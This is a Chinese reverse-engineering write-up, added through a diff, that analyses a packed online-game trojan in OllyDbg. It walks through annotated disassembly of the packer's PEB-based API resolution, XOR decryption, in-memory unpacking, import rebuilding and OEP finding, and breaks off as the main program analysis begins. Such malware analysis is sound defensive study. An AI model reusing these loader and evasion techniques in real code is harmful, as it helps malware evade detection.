@@ -1,0 +1,1747 @@
+
+
+# 网游木马详解上
+
+> 原文：[`www.pediy.com/kssd/pediy12/128169.html`](https://www.pediy.com/kssd/pediy12/128169.html)
+
+昨天心痒，硬是没事找事，找朋友要了一个样本，想来分析分析，于是今天就有了下文~~朋友说是一个游戏木马，我于是就分析了一下，感觉和我以前分析的那个木  
+  
+马有几分相似（详细见我前面那篇文章吧）~~好像外壳是一样的，内容也差不多~~~闲话不多说了~~免得被看雪上一些（不是全部）大牛看到了，说这小子整天在论坛  
+  
+上说大道理什么的~~想想也不好，其实我只想与一些共同努力的人一点帮助，打打气，没其它意思~~算了，不说了，懂的人永远懂，不懂  
+  
+的人永远不懂，进入正题~~  
+  
+英雄不会出处，英雄不必多言~~  
+  
+这款游戏木马很好很强大!  
+  
+这里我按我的分析思路，方法和步骤进行讲解，如有不当之处，请大牛们海涵~~  
+这里我想按三个阶段进行讲解，如果是初学者，可直接进行第二个阶段和第三个阶段的学习!  
+第一阶段：脱壳篇  
+第二阶段：分析主程序  
+第三阶段：分析释放文件功能  
+本人小菜一个，还有很多不懂的问题，希望有大哥能指点小弟，不甚感激!  
+  
+第一个阶段：脱壳篇  
+查壳：PEID 查得--什么都没找到  \[Overlay\] \*  
+看 EP 区段，如下图所示：  
+![](img/eb2df0326ece603ee7ea45dae6ca0195.jpg)  
+很明显经过压缩或加密了~~  
+  
+OD 载入，停在这里~~  
+00401000 >/$  B8 D507D0B0   mov     eax, B0D007D5  
+00401005  |.  B8 6FD04000   mov     eax, 0040D06F  
+0040100A  |.  8BC0          mov     eax, eax  
+0040100C  |.  8BD2          mov     edx, edx  
+0040100E  |.  55            push    ebp  
+0040100F  |.  8BE9          mov     ebp, ecx  
+00401011  |.  5D            pop     ebp  
+00401012  |.  50            push    eax  
+00401013  |.  51            push    ecx  
+00401014  |.  8BC8          mov     ecx, eax  
+00401016  |.  59            pop     ecx  
+00401017  \\.  C3            retn  
+  
+先单步吧，来到这里~~  
+0040D06F    60              pushad  
+0040D070    83EC 38         sub     esp, 38  
+0040D073    33C0            xor     eax, eax  
+0040D075    C745 D8 4765745>mov     dword ptr \[ebp-28\], 50746547  
+0040D07C    C745 DC 726F634>mov     dword ptr \[ebp-24\], 41636F72  
+0040D083    C745 E0 6464726>mov     dword ptr \[ebp-20\], 65726464  
+0040D08A    C745 E4 7373000>mov     dword ptr \[ebp-1C\], 7373  
+0040D091    8945 FC         mov     dword ptr \[ebp-4\], eax  
+0040D094    8945 F8         mov     dword ptr \[ebp-8\], eax  
+0040D097    60              pushad  
+  
+这里和我上次分析的那个很像，大家请向上看一行就明白了~~  
+0040D06D    FFE0            jmp     eax  
+凭我的经验，最后不管它进行了什么压缩和加密解密工作之后，最后还是会回到这里来~~只是一种直觉（或算是经验吧，嘿嘿），我们就先在这里下个断点吧，以免  
+  
+跑飞~~  
+  
+接下来单步调度吧  
+0040D06F    60              pushad  
+0040D070    83EC 38         sub     esp, 38  
+0040D073    33C0            xor     eax, eax  
+0040D075    C745 D8 4765745>mov     dword ptr \[ebp-28\], 50746547  
+0040D07C    C745 DC 726F634>mov     dword ptr \[ebp-24\], 41636F72  
+0040D083    C745 E0 6464726>mov     dword ptr \[ebp-20\], 65726464  
+0040D08A    C745 E4 7373000>mov     dword ptr \[ebp-1C\], 7373  
+0040D091    8945 FC         mov     dword ptr \[ebp-4\], eax  
+0040D094    8945 F8         mov     dword ptr \[ebp-8\], eax                   ; GetProcAddress  
+0040D097    60              pushad  
+0040D098    64:A1 30000000  mov     eax, dword ptr fs:\[30\]                   ; PEB  
+0040D09E    8B50 0C         mov     edx, dword ptr \[eax+C\]                   ; PEB\_LDR\_DATA  
+0040D0A1    8B42 1C         mov     eax, dword ptr \[edx+1C\]                  ; InInitializationOrderModuleList  
+0040D0A4    8B00            mov     eax, dword ptr \[eax\]                     ; kernel32.dll  
+0040D0A6    8B40 08         mov     eax, dword ptr \[eax+8\]                   ; kernel32.dll 加载基址 7C800000  
+0040D0A9    8945 FC         mov     dword ptr \[ebp-4\], eax                   ; 将 kernel32.dll 基址存入 ebp-4 中  
+0040D0AC    8BD0            mov     edx, eax                                 ; edx = kernel32.7C800000  
+0040D0AE    83C0 23         add     eax, 23  
+0040D0B1    83C0 19         add     eax, 19                                  ; kernel32.dll 基址+0x3C 地方就是 PE 头  
+0040D0B4    8B00            mov     eax, dword ptr \[eax\]  
+0040D0B6    8D4410 78       lea     eax, dword ptr \[eax+edx+78\]              ; 输出表  
+0040D0BA    8B00            mov     eax, dword ptr \[eax\]                     ; 输出表地址 262C  
+0040D0BC    8B4C02 18       mov     ecx, dword ptr \[edx+eax+18\]              ; 输出表函数的个数-->3B9  
+0040D0C0    8B5C02 20       mov     ebx, dword ptr \[edx+eax+20\]              ; 函数地址 3538  
+0040D0C4    03DA            add     ebx, edx  
+0040D0C6    49              dec     ecx  
+0040D0C7    90              nop  
+0040D0C8    85C9            test    ecx, ecx  
+0040D0CA    90              nop  
+0040D0CB    74 38           je      short 0040D105  
+0040D0CD    8D7D D8         lea     edi, dword ptr \[ebp-28\]                  ; GetProcAddress  
+0040D0D0    8B348B          mov     esi, dword ptr \[ebx+ecx\*4\]  
+0040D0D3    03F2            add     esi, edx  
+0040D0D5    51              push    ecx  
+0040D0D6    50              push    eax  
+0040D0D7    B8 09000000     mov     eax, 9  
+0040D0DC    83C0 06         add     eax, 6                                   ; eax = 0000000F GetProcAddress 长度  
+0040D0DF    8BC8            mov     ecx, eax  
+0040D0E1    58              pop     eax  
+0040D0E2    F3:A6           repe    cmps byte ptr es:\[edi\], byte ptr \[esi\]   ; 比较是不是 GetProcAddress 函数  
+0040D0E4    85C9            test    ecx, ecx  
+0040D0E6    59              pop     ecx  
+0040D0E7  ^ 75 DD           jnz     short 0040D0C6  
+0040D0E9    8B7402 24       mov     esi, dword ptr \[edx+eax+24\]              ; 函数名称序数地址 441C  
+0040D0ED    03F2            add     esi, edx  
+0040D0EF    8BF9            mov     edi, ecx  
+0040D0F1    0FB7347E        movzx   esi, word ptr \[esi+edi\*2\]                ; 198  
+0040D0F5    8B7C02 1C       mov     edi, dword ptr \[edx+eax+1C\]              ; 函数地址  
+0040D0F9    03FA            add     edi, edx  
+0040D0FB    8B3CB7          mov     edi, dword ptr \[edi+esi\*4\]  
+0040D0FE    03FA            add     edi, edx                                 ; 7C80000+AE30  
+0040D100    897D F8         mov     dword ptr \[ebp-8\], edi                   ; GetProcAddress  
+0040D103    EB 07           jmp     short 0040D10C  
+0040D105    C745 F8 0000000>mov     dword ptr \[ebp-8\], 0  
+0040D10C    61              popad  
+  
+这段代码我不想多讲了，论坛上好像有人写过这样的文章，很详细，不懂的就去看看吧，而且我也注释的很详细了，就全当复习吧~~  
+  
+上面这段代码就是查找 GetProcAddress 的地址  
+  
+0040D10D    8B4D FC         mov     ecx, dword ptr \[ebp-4\]           ; kernel32 基址  
+0040D110    33FF            xor     edi, edi  
+0040D112    3BCF            cmp     ecx, edi  
+0040D114    0F84 DA000000   je      0040D1F4  
+0040D11A    8B45 F8         mov     eax, dword ptr \[ebp-8\]           ; kernel32.GetProcAddress  
+0040D11D    3BC7            cmp     eax, edi  
+0040D11F    0F84 CF000000   je      0040D1F4  
+这里判断 kernel32 基址和 kernel32.dll 中的 GetProcAddress 地址已得到  
+  
+0040D12A    C645 E0 4C      mov     byte ptr \[ebp-20\], 4C  
+0040D12E    C645 E1 6F      mov     byte ptr \[ebp-1F\], 6F  
+0040D132    C645 E2 61      mov     byte ptr \[ebp-1E\], 61  
+0040D136    66:C745 E3 644C mov     word ptr \[ebp-1D\], 4C64  
+0040D13C    90              nop  
+0040D13D    90              nop  
+0040D13E    66:C745 E5 6962 mov     word ptr \[ebp-1B\], 6269  
+0040D144    90              nop  
+0040D145    90              nop  
+0040D146    C645 E7 72      mov     byte ptr \[ebp-19\], 72  
+0040D14A    C645 E8 61      mov     byte ptr \[ebp-18\], 61  
+0040D14E    C645 E9 72      mov     byte ptr \[ebp-17\], 72  
+0040D152    C645 EA 79      mov     byte ptr \[ebp-16\], 79  
+0040D156    C645 EB 41      mov     byte ptr \[ebp-15\], 41            ; LoadLibraryA  
+0040D15A    897D EC         mov     dword ptr \[ebp-14\], edi  
+0040D15D    FFD0            call    eax                              ; GetProcAddress  
+0040D15F    3BC6            cmp     eax, esi                         ; eax = 7C801D78 也就是 LoadLibraryA 函数地址  
+0040D161    0F84 8D000000   je      0040D1F4  
+0040D167    8945 F4         mov     dword ptr \[ebp-C\], eax           ; 将函数 LoadLibraryA 地址存入 ebp-c  
+0040D16A    8B4D FC         mov     ecx, dword ptr \[ebp-4\]  
+0040D16D    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
+0040D170    8D55 D8         lea     edx, dword ptr \[ebp-28\]  
+0040D173    52              push    edx  
+0040D174    51              push    ecx  
+0040D175    C645 D8 56      mov     byte ptr \[ebp-28\], 56  
+0040D179    C645 D9 69      mov     byte ptr \[ebp-27\], 69  
+0040D17D    C645 DA 72      mov     byte ptr \[ebp-26\], 72  
+0040D181    C645 DB 74      mov     byte ptr \[ebp-25\], 74  
+0040D185    C645 DC 75      mov     byte ptr \[ebp-24\], 75  
+0040D189    C645 DD 61      mov     byte ptr \[ebp-23\], 61  
+0040D18D    C645 DE 6C      mov     byte ptr \[ebp-22\], 6C  
+0040D191    C645 DF 41      mov     byte ptr \[ebp-21\], 41  
+0040D195    C645 E0 6C      mov     byte ptr \[ebp-20\], 6C  
+0040D199    C645 E1 6C      mov     byte ptr \[ebp-1F\], 6C  
+0040D19D    C645 E2 6F      mov     byte ptr \[ebp-1E\], 6F  
+0040D1A1    C645 E3 63      mov     byte ptr \[ebp-1D\], 63            ; VirtualAlloc  
+0040D1A5    897D E4         mov     dword ptr \[ebp-1C\], edi  
+0040D1A8    FFD0            call    eax                              ; GetProcAddress  
+0040D1AA    3BC6            cmp     eax, esi                         ; eax = 7C809AE1 也就是 VirtualAlloc 函数地址  
+0040D1AC    74 46           je      short 0040D1F4  
+0040D1AE    8945 F0         mov     dword ptr \[ebp-10\], eax          ; 将函数 VirtualAlloc 地址存入 ebp-10  
+0040D1B1    8B4D FC         mov     ecx, dword ptr \[ebp-4\]  
+0040D1B4    8B45 F8         mov     eax, dword ptr \[ebp-8\]  
+0040D1B7    8D55 D8         lea     edx, dword ptr \[ebp-28\]  
+0040D1BA    52              push    edx  
+0040D1BB    51              push    ecx  
+0040D1BC    C645 D8 56      mov     byte ptr \[ebp-28\], 56  
+0040D1C0    C645 D9 69      mov     byte ptr \[ebp-27\], 69  
+0040D1C4    C645 DA 72      mov     byte ptr \[ebp-26\], 72  
+0040D1C8    C645 DB 74      mov     byte ptr \[ebp-25\], 74  
+0040D1CC    C645 DC 75      mov     byte ptr \[ebp-24\], 75  
+0040D1D0    C645 DD 61      mov     byte ptr \[ebp-23\], 61  
+0040D1D4    C645 DE 6C      mov     byte ptr \[ebp-22\], 6C  
+0040D1D8    C645 DF 46      mov     byte ptr \[ebp-21\], 46  
+0040D1DC    C645 E0 72      mov     byte ptr \[ebp-20\], 72  
+0040D1E0    C645 E1 65      mov     byte ptr \[ebp-1F\], 65  
+0040D1E4    C645 E2 65      mov     byte ptr \[ebp-1E\], 65            ; VirtualFree  
+0040D1E8    897D E3         mov     dword ptr \[ebp-1D\], edi  
+0040D1EB    FFD0            call    eax                              ; GetProcAddress  
+0040D1ED    3BC6            cmp     eax, esi                         ; eax = 7C809B74 也就是 VirtualAlloc 函数的地址  
+0040D1EF    74 03           je      short 0040D1F4  
+0040D1F1    8945 EC         mov     dword ptr \[ebp-14\], eax          ; 将函数 VirtualAlloc 地址存入 ebp-14  
+  
+上面代码是得到三个非常重要的函数的地址 LoadLibraryA,VirtualAlloc,VirtualFree，并将它们分别存入 ebp-c,ebp-10,ebp-14,之中，如下图所示：  
+![](img/36324f09b69b09dfa93abb7eda5877a8.jpg)  
+  
+然后是一些花指令吧~~  
+0040D1F4    90              nop  
+0040D1F5    90              nop  
+0040D1F6    8BC0            mov     eax, eax  
+0040D1F8    90              nop  
+0040D1F9    90              nop  
+  
+接着看到一个 Call 如下，进去看看：  
+0040D1FA    E8 10000000     call    0040D20F----->这是一个近 CALL，F7 进入，到下面的地址处：  
+\------------------------------------------------------------------------------------------  
+0040D20F    5E              pop     esi                              ; 0040D1FF  
+0040D210    8BFE            mov     edi, esi  
+0040D212    81EF 9B010000   sub     edi, 19B  
+0040D218    57              push    edi  
+0040D219    6A 04           push    4  
+0040D21B    BF 00100000     mov     edi, 1000                          
+0040D220    57              push    edi               
+0040D221    57              push    edi             ; size = 1000  
+0040D222    6A 00           push    0  
+0040D224    FF55 F0         call    dword ptr \[ebp-10\]               ; VirtualAlloc  
+0040D227    59              pop     ecx                              ; 40D064  
+0040D228    BB 00800000     mov     ebx, 8000  
+0040D22D    53              push    ebx  
+0040D22E    6A 00           push    0  
+0040D230    50              push    eax                              ; VirtualAlloc 得到的分配的空间基址 380000  
+0040D231    51              push    ecx                              ; 40D064  
+0040D232    46              inc     esi  
+0040D233    8B16            mov     edx, dword ptr \[esi\]             ; edx = 00400000  
+0040D235    52              push    edx  
+0040D236    50              push    eax  
+0040D237    50              push    eax  
+0040D238    8B46 06         mov     eax, dword ptr \[esi+6\]           ; eax = 15E2  
+0040D23B    03C2            add     eax, edx  
+0040D23D    8BF0            mov     esi, eax                         ; esi = eax = 004015E2  
+0040D23F    8B00            mov     eax, dword ptr \[eax\]             ; eax = 00004794  
+0040D241    03C2            add     eax, edx  
+0040D243    8941 05         mov     dword ptr \[ecx+5\], eax           ; \[0040D069\] = 00404794  
+0040D246    58              pop     eax  
+0040D247    8946 04         mov     dword ptr \[esi+4\], eax           ; \[004015E6\] = 00380000  
+0040D24A    8B46 0C         mov     eax, dword ptr \[esi+C\]  
+0040D24D    03C2            add     eax, edx  
+0040D24F    50              push    eax                              ; eax = 004010E8  
+0040D250    8B46 10         mov     eax, dword ptr \[esi+10\]  
+0040D253    03C2            add     eax, edx  
+0040D255    FFD0            call    eax                              ; call 0040101F----->这里进入看看~~  
+\--------------------------------------------------------------------------------------------------------------  
+0040101C   .  15 24906050   adc     eax, 50609024  
+00401021   .  52            push    edx  
+00401022   .  8B4424 2C     mov     eax, dword ptr \[esp+2C\]             ;  eax = 004010E8  
+00401026   .  8BF0          mov     esi, eax                            ;  esi = eax = 004010E8  
+00401028   .  8B5424 30     mov     edx, dword ptr \[esp+30\]  
+0040102C   .  8BFA          mov     edi, edx                            ;  edi = edx = 00380000  
+0040102E   .  5A            pop     edx                                 ;  edx = 00400000  
+0040102F   .  58            pop     eax                                 ;  eax = 0040101F  
+00401030   .  FC            cld                                         ;  DF = 0  
+00401031   .  60            pushad  
+00401032   >  8A16          mov     dl, byte ptr \[esi\]                  ;  逐个取 esi = 004010E8 地址每位数  
+00401034   .  84D2          test    dl, dl                              ;  判断是否为零  
+00401036   .  74 08         je      short 00401040  
+00401038   .  80F2 15       xor     dl, 15                              ;  不为空就与 15 做异或操作  
+0040103B   .  8816          mov     byte ptr \[esi\], dl                  ;  异或之后，重新填入到 004010E8 相应位置  
+0040103D   .  46            inc     esi                                 ;  逐个取出  
+0040103E   .^ EB F2         jmp     short 00401032                      ;  循环  
+00401040   >  61            popad  
+00401041   .  33D2          xor     edx, edx                            ;  edx = 0  
+00401043   .  B3 80         mov     bl, 80                              ;  bl = 80  
+00401045   >  A4            movs    byte ptr es:\[edi\], byte ptr \[esi\]   ;  将刚才加密的 esi(004010E8)中第一个数据拷贝到 edi(00380000)中  
+00401046   .  B2 02         mov     dl, 2  
+00401048   > /E8 71000000   call    004010BE        ------->由于后面有几处都调用了这个函数，先分析一下吧~~  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+004010BE  /$  02DB          add     bl, bl                       ;  bl+bl 看是否为零  
+004010C0  |.  75 05         jnz     short 004010C7               ;  不为零就跳走  
+004010C2  |.  8A1E          mov     bl, byte ptr \[esi\]           ;  为零就将 esi 中的下一个数据取出一个传入给 bl  
+004010C4  |.  46            inc     esi                          ;  esi++  
+004010C5  |.  10DB          adc     bl, bl                       ;  bl+bl 带进位相加  
+004010C7  \\>  C3            retn                                 ;  返回  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+0040104D   .  8BC0          mov     eax, eax  
+0040104F   .^ 73 F4         jnb     short 00401045                              ;  循环，根据前面的规则将 esi 中的一个数据传入到 edi 中  
+00401051   .  33C9          xor     ecx, ecx  
+00401053   .  E8 66000000   call    004010BE  
+00401058   .  73 1E         jnb     short 00401078  
+0040105A   .  33C0          xor     eax, eax  
+0040105C   .  E8 5D000000   call    004010BE  
+00401061   .  8BC0          mov     eax, eax  
+00401063   .  73 23         jnb     short 00401088  
+00401065   .  B2 02         mov     dl, 2  
+00401067   .  41            inc     ecx  
+00401068   .  B0 10         mov     al, 10                                      ;  进行四次循环，使 al = 10  
+0040106A   >  E8 4F000000   call    004010BE  
+0040106F   .  12C0          adc     al, al  
+00401071   .^ 73 F7         jnb     short 0040106A  
+00401073   .  75 3F         jnz     short 004010B4  
+00401075   .  AA            stos    byte ptr es:\[edi\]  
+00401076   .^ EB D0         jmp     short 00401048  
+00401078   >  E8 4D000000   call    004010CA  
+0040107D   .  2BCA          sub     ecx, edx  
+0040107F   .  75 10         jnz     short 00401091  
+00401081   .  E8 42000000   call    004010C8  
+00401086   .  EB 28         jmp     short 004010B0  
+00401088   >  AC            lods    byte ptr \[esi\]  
+00401089   .  D1E8          shr     eax, 1  
+0040108B   .  74 4F         je      short 004010DC  
+0040108D   .  13C9          adc     ecx, ecx  
+0040108F   .  EB 1C         jmp     short 004010AD  
+00401091   >  91            xchg    eax, ecx  
+00401092   .  48            dec     eax  
+00401093   .  C1E0 08       shl     eax, 8  
+00401096   .  AC            lods    byte ptr \[esi\]  
+00401097   .  E8 2C000000   call    004010C8  
+0040109C   .  3D 007D0000   cmp     eax, 7D00  
+004010A1   .  73 0A         jnb     short 004010AD  
+004010A3   .  80FC 05       cmp     ah, 5  
+004010A6   .  73 06         jnb     short 004010AE  
+004010A8   .  83F8 7F       cmp     eax, 7F  
+004010AB   .  77 02         ja      short 004010AF  
+004010AD   >  41            inc     ecx  
+004010AE   >  41            inc     ecx  
+004010AF   >  95            xchg    eax, ebp  
+004010B0   >  8BC5          mov     eax, ebp  
+004010B2   .  B2 01         mov     dl, 1  
+004010B4   >  56            push    esi  
+004010B5   .  8BF7          mov     esi, edi  
+004010B7   .  2BF0          sub     esi, eax  
+004010B9   .  F3:A4         rep     movs byte ptr es:\[edi\], byte ptr \[esi\]      ;  将 esi 中的数据传入到 edi 中  
+004010BB   .  5E            pop     esi  
+004010BC   .^\\EB 8A         jmp     short 00401048  
+.........  
+004010DC   > \\2B7C24 28     sub     edi, dword ptr \[esp+28\]  
+004010E0   .  897C24 1C     mov     dword ptr \[esp+1C\], edi  
+004010E4   .  61            popad  
+004010E5   .  C2 0800       retn    8  
+  
+  
+上面的代码是做了一些加密操作，其中有将 esi(004010E8)处的数据逐个与 0x15 进行异或，最后根据一些解密算法，将数据送入到 edi\[380000\]处~~  
+0040D257    6A 04           push    4    ----->这里很清楚就是我们前面进入 call eax 后的返回地址  
+上面就是程序的解密部分，我们就不单步跟踪了，有兴趣的朋友可以跟踪看看~~~我这里在 004010E5 处 F2 下断，然后 F9，即可  
+返回到了下面这个地址~~~很显然，前面我们调用了一个 VirtualAlloc 分配了一个内存，内存地址是 00380000，然后有一个 Call eax，这里我们就清楚了，原来那个  
+  
+call eax 就是一段解密函数代码，将代码解密放到分配的内存中~~~  
+  
+继续吧~~~革命才刚刚开始呢  
+0040D257    6A 04           push    4  
+0040D259    57              push    edi  
+0040D25A    8B46 14         mov     eax, dword ptr \[esi+14\]  
+0040D25D    50              push    eax                                         ; size  
+0040D25E    6A 00           push    0  
+0040D260    FF55 F0         call    dword ptr \[ebp-10\]                          ; VirtualAlloc 返回 eax = 0039000  
+0040D263    5A              pop     edx  
+0040D264    53              push    ebx  
+0040D265    6A 00           push    0  
+0040D267    50              push    eax  
+0040D268    FF75 EC         push    dword ptr \[ebp-14\]                          ; VirtualFree  
+0040D26B    52              push    edx  
+0040D26C    6A 04           push    4  
+0040D26E    57              push    edi                                         ; edi = 00390000  
+0040D26F    8BF8            mov     edi, eax  
+0040D271    53              push    ebx                                         ; size = 8000  
+0040D272    6A 00           push    0  
+0040D274    FF55 F0         call    dword ptr \[ebp-10\]                          ; VirtualAlloc 得到 eax = 3A0000  
+0040D277    5A              pop     edx  
+0040D278    53              push    ebx  
+0040D279    6A 00           push    0  
+0040D27B    50              push    eax  
+0040D27C    FF75 EC         push    dword ptr \[ebp-14\]                          ; VirtualFree  
+0040D27F    FF3424          push    dword ptr \[esp\]  
+0040D282    8BC8            mov     ecx, eax  
+0040D284    50              push    eax  
+0040D285    54              push    esp  
+0040D286    FF76 14         push    dword ptr \[esi+14\]  
+0040D289    57              push    edi  
+0040D28A    FF76 18         push    dword ptr \[esi+18\]  
+0040D28D    8B46 1C         mov     eax, dword ptr \[esi+1C\]  
+0040D290    03C2            add     eax, edx  
+0040D292    50              push    eax  
+0040D293    53              push    ebx  
+0040D294    51              push    ecx  
+0040D295    8BDA            mov     ebx, edx  
+0040D297    FF56 04         call    dword ptr \[esi+4\]                           ; call 380000  
+  
+上面这段代码分配了两个内存地址 39000 和 3A000 空间，然后调用我们刚才拷贝到内存地址 380000 处的代码~~~，为了将问题讲清楚，我也跟进去看看，看刚才拷贝的是  
+  
+什么代码，嘿嘿！  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+00380000    55              push    ebp  
+00380001    8BEC            mov     ebp, esp  
+00380003    83EC 28         sub     esp, 28  
+00380006    8065 FF 00      and     byte ptr \[ebp-1\], 0  
+0038000A    53              push    ebx  
+0038000B    56              push    esi  
+0038000C    57              push    edi  
+0038000D    6A 01           push    1  
+0038000F    33F6            xor     esi, esi  
+00380011    817D 0C D87C000>cmp     dword ptr \[ebp+C\], 7CD8  
+00380018    5B              pop     ebx  
+..........  
+0038087C    8B4D 20         mov     ecx, dword ptr \[ebp+20\]  
+0038087F    8B45 F4         mov     eax, dword ptr \[ebp-C\]  
+00380882    8901            mov     dword ptr \[ecx\], eax  
+00380884    33C0            xor     eax, eax  
+00380886    5F              pop     edi  
+00380887    5E              pop     esi  
+00380888    5B              pop     ebx  
+00380889    C9              leave  
+0038088A    C2 1C00         retn    1C  
+.........  
+00380FFA    0000            add     byte ptr \[eax\], al  
+00380FFC    0000            add     byte ptr \[eax\], al  
+00380FFE    0000            add     byte ptr \[eax\], al  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+上面这段代码正有是从 380000~~380FFE，大小为 1000，代码比较长，也较复杂，分析半天，我也不知道它在做什么，里面好像几个嵌套循环，这里希望有知道的牛人  
+  
+指点指点~~谢谢!  
+  
+单步跟踪，来到如下代码处，中断程序还对 00401000 代码进行了一些处理，然后又进行下面的操作~~  
+0040D2F4    53              push    ebx  
+0040D2F5    AD              lods    dword ptr \[esi\]  
+0040D2F6    85C0            test    eax, eax  
+0040D2F8    74 38           je      short 0040D332  
+0040D2FA    8BF8            mov     edi, eax  
+0040D2FC    033C24          add     edi, dword ptr \[esp\]  
+0040D2FF    56              push    esi                                        ; kernel32.dll  
+0040D300    FF55 F4         call    dword ptr \[ebp-C\]                          ; LoadLibraryA  
+0040D303    8BD8            mov     ebx, eax                                   ; kernel32.dll 基址  
+0040D305    AC              lods    byte ptr \[esi\]                             ; 装载 kernel32.dll 字符串  
+0040D306    84C0            test    al, al  
+0040D308  ^ 75 FB           jnz     short 0040D305  
+0040D30A    AD              lods    dword ptr \[esi\]  
+0040D30B    85C0            test    eax, eax  
+0040D30D  ^ 74 E6           je      short 0040D2F5  
+0040D30F    83EE 04         sub     esi, 4  
+0040D312    AD              lods    dword ptr \[esi\]                            ; 取 LoadLibraryA  
+0040D313    A9 00000080     test    eax, 80000000  
+0040D318    75 0B           jnz     short 0040D325  
+0040D31A    83EE 04         sub     esi, 4  
+0040D31D    56              push    esi  
+0040D31E    53              push    ebx  
+0040D31F    FF55 F8         call    dword ptr \[ebp-8\]                          ; GetProcAddress  
+0040D322    AB              stos    dword ptr es:\[edi\]  
+0040D323  ^ EB E0           jmp     short 0040D305  
+0040D325    25 FFFFFF7F     and     eax, 7FFFFFFF  
+0040D32A    50              push    eax  
+0040D32B    53              push    ebx  
+0040D32C    FF55 F8         call    dword ptr \[ebp-8\]  
+0040D32F    AB              stos    dword ptr es:\[edi\]  
+0040D330  ^ EB D8           jmp     short 0040D30A  
+0040D332    5D              pop     ebp  
+0040D333    5F              pop     edi  
+0040D334    C3              retn  
+  
+这段代码大家很熟悉，重建输入表，这里是将重建的输入表存放在了 00405000 处了~~  
+![](img/d1bc00950cc57626ba4775f78c78e580.jpg)  
+在 0040D334 这里，程序返回到了如下地址处(系统模块 kernel32.dll 中)：  
+7C809B74 >  8BFF            mov     edi, edi  
+7C809B76    55              push    ebp  
+7C809B77    8BEC            mov     ebp, esp                                   ; 00400000  
+7C809B79    FF75 10         push    dword ptr \[ebp+10\]                         ; 8000  
+7C809B7C    FF75 0C         push    dword ptr \[ebp+C\]  
+7C809B7F    FF75 08         push    dword ptr \[ebp+8\]                          ; 3A0000  
+7C809B82    6A FF           push    -1  
+7C809B84    E8 09000000     call    VirtualFreeEx  
+7C809B89    5D              pop     ebp  
+7C809B8A    C2 0C00         retn    0C  
+  
+这里的 8000 = 1000 + 1000 + 1000 + 5000(这些内存是在 380000 的代码中执行完成的)，释放分配在 3A0000 中的 8000 的内存空间  
+  
+上面的 retn 返回后，单步就可以来到 OEP 了，嘿嘿~~~因为前面的工作都已经做完了，前面的工作，主要有一处就是在执行 380000 的代码时不清楚，还请高人指点~~~  
+00404794    55              push    ebp        ----->OEP  
+00404795    8BEC            mov     ebp, esp  
+00404797    6A FF           push    -1  
+00404799    68 E8504000     push    004050E8  
+0040479E    68 00474000     push    00404700                                   ; jmp 到 MSVCRT.\_except\_handler3  
+  
+同时有两种比较快的方式达到 OEP，上面的分析对于刚入门的同学可能不是很懂，以后在慢慢学习，吸收吧~~~  
+第一种：就是凭直觉，发现单步执行程序到  
+0040D06F    60              pushad  
+0040D070    83EC 38         sub     esp, 38  
+这里时，可以看到上面有一条语句：  
+0040D06D    FFE0            jmp     eax      ----->直接在这里 F2 下断，然后 F9,来到这里，F7 进入即可来到 OEP!  
+  
+第二种方法：就是上一篇文章有人留言说可以用 ESP 定律法达到 OEP，这里我试了试，可以~~单步来到如下地址  
+0040D06F    60              pushad  
+0040D070    83EC 38         sub     esp, 38    ---->单步到这里时，用 ESP 定律即可，不会 ESP 定律的不要问我了!  
+同样可以快速达到 OEP!  
+  
+这样我们就对这个样本的外壳分析完成了，下面就是脱壳了，脱壳我就不讲了，直接用 OD 插件或用 LordPE+ImportREC,随你便!  
+  
+脱壳中.........  
+  
+脱壳完成了，嘿嘿~~非常顺利!脱壳后的文件命名为 Cracker.exe  
+  
+休息了半个小时~~~  
+  
+  
+继续吧！人生不是在不停的忙碌，忙碌，再忙碌~~  
+  
+第二个阶段：主程序 Cracker.exe 的分析  
+首先查壳：PEID 查得是 Visual C++6.0(其实我也很喜欢用 VC6.0,老是用不习惯 VS2008)  
+  
+OD 载入，停留在这里~~  
+00404794 >/$  55            push    ebp  
+00404795  |.  8BEC          mov     ebp, esp  
+00404797  |.  6A FF         push    -1  
+00404799  |.  68 E8504000   push    004050E8  
+0040479E  |.  68 00474000   push    <jmp.&msvcrt.\_except\_handler3>   ;  SE 处理程序安装  
+004047A3  |.  64:A1 0000000>mov     eax, dword ptr fs:\[0\]  
+004047A9  |.  50            push    eax  
+004047AA  |.  64:8925 00000>mov     dword ptr fs:\[0\], esp  
+  
+不用解释什么了吧，很明显 VC6.0 的程序~~~  
+  
+这里不用单步跟踪，可以直接将鼠标向下翻，来到如下地址处：  
+004048BB  |.  53            push    ebx                              ; /pModule  
+004048BC  |.  FF15 04504000 call    dword ptr \[<&kernel32.GetModuleH>; \\GetModuleHandleA  
+004048C2  |.  50            push    eax  
+004048C3  |.  E8 3BEEFFFF   call    00403703      -------->关键 CALL  
+004048C8  |.  8945 98       mov     dword ptr \[ebp-68\], eax  
+004048CB  |.  50            push    eax                              ; /status  
+004048CC  |.  FF15 B8504000 call    dword ptr \[<&msvcrt.exit>\]       ; \\exit  
+  
+前面是一个 GetModuleHandleA，后面是一个 exit，中间只有一个 CALL，那很明显这个 CALL 就是程序的主功能了吧，所以的操作都应该在这个程序中完成!  
+在 004048C3 处，先按 F2 下断，然后等程序运行到这里，按 F7 进入，来到如下地址处：  
+00403703  /$  55            push    ebp  
+00403704  |.  8BEC          mov     ebp, esp  
+00403706  |.  56            push    esi  
+00403707  |.  57            push    edi  
+00403708  |.  55            push    ebp  
+00403709  |.  5D            pop     ebp  
+0040370A  |.  E8 57F3FFFF   call    00402A66  ---------->F7 进入  
+0040370F  |.  BE 04010000   mov     esi, 104  
+\-----------------------------------------------------------------  
+call 00402A66  
